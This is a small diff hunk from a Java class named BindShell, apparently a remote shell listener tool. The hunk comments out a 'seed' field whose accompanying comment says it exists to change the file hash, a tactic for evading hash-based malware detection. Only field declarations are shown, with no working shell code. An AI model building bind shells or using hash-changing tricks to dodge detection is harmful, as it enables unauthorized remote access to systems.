@@ -16,7 +16,7 @@ import java.util.Arrays;
 public class BindShell {
  
  // NOTE: Change seed to help you change the file hash.
- private String seed    = "3301Kira";
+ //private String seed    = "3301Kira";
  private int     port   = -1;
  private String  os     = null;
  private String  shell  = null;
